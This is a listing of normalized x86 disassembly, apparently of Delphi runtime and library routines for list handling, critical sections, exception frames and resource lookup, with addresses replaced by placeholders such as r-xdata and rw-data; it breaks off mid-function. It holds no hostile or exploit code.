mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_413650
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4125e4
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
mov eax [ esi + 0x4 ]
call sub_403258
mov eax [ esi + 0x8 ]
call sub_403258
mov eax [ esi + 0xc ]
call sub_403258
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_412624
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4137ac
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4031bc
test al al
jne r-xdata
sub_412684
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4137ac
mov edx eax
mov eax ebp
call sub_40346c
test al al
jne r-xdata
sub_4126c8
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412763
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031a8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041f4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_412624
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41276a
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
sub_412788
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_404f84
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4127a8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4137ac
mov edx edi
call sub_412788
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4137ac
mov edx edi
call sub_412788
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41369c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_412788
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41369c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_41284c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4137ac
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_412684
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_412898
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_412568
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413650
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_41290c
push ebx
push esi
push edi
push ebp
call sub_4035cc
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4137ac
call sub_403258
inc edi
dec ebp
jne r-xdata
sub_412968
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4137ac
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_4124f8
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_4129ac
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_412624
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4137ac
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4129f0
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_412a73
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4031a8
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412a7a
lea eax [ ebp - 0x10c ]
call sub_403f90
retn
sub_412a80
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_412968
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_41248c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4129f0
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4137ac
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4137ac
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40346c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_412968
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41369c
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_413650
sub_412b6c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4137ac
mov edx ebp
call sub_412770
test al al
jne r-xdata
sub_412bb0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_412568
mov edx eax
mov eax [ edi + 0x4 ]
call sub_413650
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4137ac
mov eax [ eax + 0xc ]
mov edx ebp
call sub_413808
test eax eax
jge r-xdata
sub_412c0c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4137ac
mov esi eax
mov edx ebp
mov eax esi
call sub_4127a8
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403258
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41369c
sub_412c5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_412b48
xor eax eax
push ebp
push sub_412d5b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403564
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412d62
mov eax [ rw-data ]
call sub_412c00
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413650
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4137ac
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412684
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413650
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4137ac
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_412d62
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_412d88
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_412db8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_412b48
xor edx edx
push ebp
push sub_412e2f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_412c00
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403a78
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4137ac
mov edx [ ebp - 0x4 ]
call sub_412624
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_412e4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_412eac
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412eb3
lea eax [ ebp - 0xc ]
call sub_403f90
retn
sub_412eb8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412b48
xor eax eax
push ebp
push sub_412efe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4129ac
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f05
mov eax [ rw-data ]
call sub_412c00
retn
sub_412f0c
push ebx
push esi
mov esi eax
mov eax esi
call sub_412eb8
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_412e4c
sub_412f2c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412b48
xor eax eax
push ebp
push sub_412f91
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412b6c
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412b54
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f98
mov eax [ rw-data ]
call sub_412c00
retn
mov eax ebx
call sub_4031e4
mov ebx eax
sub_412f9c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412b48
xor eax eax
push ebp
push sub_412fde
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412c0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412fe5
mov eax [ rw-data ]
call sub_412c00
retn
sub_412fe8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412b48
xor eax eax
push ebp
push sub_41302a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412bb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413031
mov eax [ rw-data ]
call sub_412c00
retn
sub_413034
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_412b48
xor eax eax
push ebp
push sub_41307b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_412a80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413082
mov eax [ rw-data ]
call sub_412c00
retn
sub_413088
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412b48
xor eax eax
push ebp
push sub_4130d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_41284c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130dd
mov eax [ rw-data ]
call sub_412c00
retn
sub_41313c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403564
pop ebp
retn 0x8
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_413174
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41313c
mov edx eax
mov eax [ rw-data ]
call sub_413a90
pop edi
pop esi
pop ebx
retn
sub_4131a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413b18
mov esi eax
xor edx edx
push ebp
push sub_41320a
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413b7c
retn
mov edx ebx
mov eax esi
call sub_4137ac
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403a78
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41321c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407b88
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41325c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403fe4
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4132a0
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_413808
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_413650
sub_4132f8
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4137ac
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413338
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4132f8
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_41335c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404450
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_415c7c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4133d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41577c
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_4133e0
push ebx
call sub_405cfc
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405cfc
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_413650
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov ebx eax
call sub_405cfc
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov ebx eax
call sub_405cfc
mov [ eax + 0xc ] ebx
sub_413438
push ebx
push esi
push edi
call sub_405cfc
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4137ac
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_413468
push ebx
push esi
call sub_405cfc
mov eax [ eax + 0x8 ]
call sub_403258
call sub_405cfc
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_413894
mov esi eax
call sub_405cfc
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_41369c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405cfc
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403258
sub_4134c4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_41355a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413561
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4031e4
call sub_4134c4
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031a8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_404fac
call sub_404ffc
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_41335c
or bl al
sub_41356c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41361a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4135fb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4031a0
call sub_4134c4
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4133e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413602
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413438
retn
call sub_413468
sub_41362e
add [ eax ] al
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_413650
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41369c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413738
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028b8
mov edx esi
mov eax ebx
call sub_4137ac
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413700
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4136fc
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
jmp sub_4039cc
sub_413738
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_413780
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405a90
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413700
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413787
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_4137ac
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413738
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4137d4
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
